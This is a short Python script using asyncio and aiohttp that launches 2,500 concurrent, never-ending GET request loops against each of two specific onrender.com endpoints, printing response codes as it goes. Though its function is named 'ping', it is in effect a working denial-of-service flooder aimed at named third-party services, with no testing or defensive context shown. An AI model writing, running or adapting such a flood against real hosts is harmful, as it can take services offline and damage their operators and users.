import asyncio
import aiohttp

TARGETS = [
    "https://ere-dv2x.onrender.com/recent-pets",
    "https://premium-github-io.onrender.com/recent-pets"
]

CONCURRENCY = 2500
TIMEOUT = 30

async def ping(session, url, index):
    while True:
        try:
            async with session.get(url, timeout=TIMEOUT) as resp:
                print(f"[{index}] {url} -> {resp.status}")
        except Exception as e:
            print(f"[{index}] {url} -> ERROR: {e}")
        await asyncio.sleep(0)  # Allow cooperative multitasking

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for url in TARGETS:
            for i in range(CONCURRENCY):
                tasks.append(ping(session, url, i))
        await asyncio.gather(*tasks)

asyncio.run(main())
